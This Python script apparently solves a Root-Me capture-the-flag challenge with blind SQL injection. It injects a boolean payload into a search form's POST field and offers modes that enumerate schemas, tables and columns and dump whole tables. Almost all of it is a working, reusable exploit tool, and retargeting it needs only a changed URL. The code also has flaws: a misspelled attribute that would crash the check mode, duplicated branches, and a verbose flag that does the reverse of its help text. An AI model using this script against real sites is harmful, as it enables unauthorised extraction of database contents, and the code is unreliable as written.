#!/usr/bin/env python

import sqli_blinder
import requests
import argparse
import logging

logging.basicConfig(level=logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.WARNING)

def request_func(sql):
	"""this function must return True for sql=`1=1` and False for sql=`1=0`"""

	http_proxy = "http://localhost:8080"
	proxyDict = {
		"https": http_proxy,
		"http": http_proxy
	}
	# comment this for proxy
	proxyDict = None

	burp0_url = "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche"
	burp0_headers = {"User-Agent": "fefefe", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
					 "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge01.root-me.org", "Connection": "close", "Referer": "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"recherche": f"f' or ({sql}) -- "}
	r = requests.post(burp0_url, headers=burp0_headers,
					  data=burp0_data, proxies=proxyDict)

	if r.status_code != 200 or "Unable to prepare statement" in r.text:
		logging.error(f"code: {r.status_code}, ошибка sql: {sql}")
		exit(-1)
	if "News system" in r.text:
		return True
	else:
		return False



def required(arg, mode):
	logging.error(f"argument {arg} is required for mode {mode}")
	exit(-1)


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("mode",help="mode - one of ['check','count','one','get','schemata','tables','columns','dump']",
								choices= ['check','count','one','get','schemata','tables','columns','dump'])
	parser.add_argument("-s","--schema",
						help = "schema name");
	parser.add_argument("-t","--table",
						help = "table nmae");
	parser.add_argument("-c","--column", nargs='+',
						help="column names. One or more, separated by space (ex, -c username password)\n expressions are acceptable (ex, -c substring(name,1,3) 'cast(id as TEXT)'")
	parser.add_argument("-w", "--where", 
						help="where clause")
	parser.add_argument("-i", "--index", help="index of row")
	parser.add_argument(
		"--threads", help="number of threads", type=int, default=16)
	parser.add_argument("--dbms", help="DBMS",
						choices=["mysql", "mssql", "sqlite", "oracle", "postgre"])
	parser.add_argument("--order-by", help="order by column name or index")
	parser.add_argument("-v", "--verbose", help="disable logging debug",
						default=False, action="store_true")
	parser.add_argument("--disable-position-opt", help="Disable char-in-position optimisation. For example, GUID always have same symbol dash in known position. If statistics shows that symbol is always same in same position, then check this char first.",default=False, action="store_true")
	parser.add_argument("--disable-alphabet-opt", help="Disable alphabet auto create optimisation. Idea of optimisation is auto build charset for search based on already found characters and narrow the scope of search",default=False, action="store_true")
	parser.add_argument("--disable-huffman-opt", help="Disable huffman tree optimisation. Idea of optimisation is to make search based on huffman-tree; huffman tree is built based on already found selective distribution",default=False, action="store_true")
'''
	`char_in_position_opt` - do statistics analyze of chars in same position. For example, GUID always have same symbol dash in known position. If statistics shows that symbol always in same position, then check this char first.
		 `alphabet_autocreate_opt` - auto build charset for search based on already found characters
		 `huffman_tree_opt` - make huffman-tree search; huffman tree is built based on selective distribution
'''
	args, _ = parser.parse_known_args()

	if args.threads <= 0:
		logging.error("threads > 0")
		exit(-1)
	if args.threads == 1:
		multithreaded = False
	else:
		multithreaded = True



	if args.mode == "check":
		if args.dbms is None:
			args.dbms = "sqlite"
		sqlib = sqli_blinder.SQLiBlinder(
			request_func, args.dbms, multithreaded=multithreaded, threads=args.threads,
			char_in_position_opt=not args.disable_position_opt, 
			alphabet_autocreate_opt=not args.disable_alphabet_opt,
			huffman_tree_opt=not args.disable_huffmant_opt)
		check = sqlib.check()
		logging.info(check)
		exit(0)

	sqlib = sqli_blinder.SQLiBlinder(
		request_func, args.dbms, multithreaded=multithreaded, threads=args.threads)

	if args.dbms is None:
		required("dbms", args.mode)

	if args.mode == "schemata":
		logging.info(sqlib.get_schemata())
		exit(0)

	if args.mode == "tables":
		logging.info(sqlib.get_tables(args.schema))

		exit(0)

	if args.table is None:
		required("table", args.mode)

	if args.verbose:
		logging.basicConfig(level=logging.INFO)

	if args.mode == "count":
		logging.info(sqlib.get_count(args.table, args.where))
		exit(0)
	elif args.mode == "one":
		if args.index is None:
			required("index", args.mode)
		if args.column is None:
			required("column", args.mode)
		logging.info(sqlib.get_string(args.table, args.column, int(args.index),
							   args.where, args.order_by))
		exit(0)
	elif args.mode == "get":
		if args.column is None:
			required("column", args.mode)
		logging.info(sqlib.get(args.column, args.table, args.where,
						args.order_by))
		exit(0)
	elif args.mode == "columns":
		logging.info(sqlib.get_columns(args.table))
		exit(0)
	elif args.mode == "dump":
		columns = sqlib.get_columns(args.table)
		if columns is None:
			logging.info("No columns extracted, exiting")
			exit(-1)
		logging.info(f"columns: {columns}")
		logging.info(sqlib.get(columns, args.table, args.where,
						args.order_by))
		exit(0)
	elif args.mode == "columns":
		logging.info(sqlib.get_columns(args.table))
		exit(0)
	elif args.mode == "dump":
		columns = sqlib.get_columns(args.table)
		if columns is None:
			logging.info("No columns extracted, exiting")
			exit(-1)
		logging.info(f"columns: {columns}")
		logging.info(sqlib.get(columns, args.table, args.where,
						args.order_by))
		exit(0)

